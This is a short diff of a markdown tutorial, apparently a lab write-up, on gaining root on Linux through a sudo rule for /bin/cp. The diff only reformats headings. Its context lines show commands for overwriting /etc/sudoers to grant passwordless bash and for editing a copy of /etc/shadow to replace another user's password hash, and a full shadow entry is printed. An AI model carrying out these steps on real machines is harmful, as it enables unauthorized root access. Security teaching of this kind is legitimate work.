@@ -424,7 +424,7 @@ cp: Missing Operands
 > /home/franky
 ```
 
-Method 1 - Patch /etc/sudoers
+### Method 1 - Patch /etc/sudoers
 
 ```
 [franky@ubuntu]$ touch sudoers_Im_Coming
@@ -451,7 +451,7 @@ franky	...				:NOPASSWORD	/bin/cp # Change /bin/cp to /bin/bash
 ```
 
 
-Method 2 - Patch /etc/shadow
+### Method 2 - Patch /etc/shadow
 
 ```
 [franky@ubuntu]$ touch my_shadow
@@ -461,7 +461,7 @@ Method 2 - Patch /etc/shadow
 [franky@ubuntu]$ vi my_shadow
 ```
 
-ViM screen, Replace the hash of tester by franky's hash
+### ViM screen, Replace the hash of tester by franky's hash
 
 ```
 tester:$6$5r7X8q0p$8/mDvW4mkkuXNwmGU78TlE1n3JXf1hHNZwKbZlDjdchRGE.7cRb/IwwclWQtKeWUIR0IMbKzIcY8OIOfOVFhE0:17954:0:99999:7:::
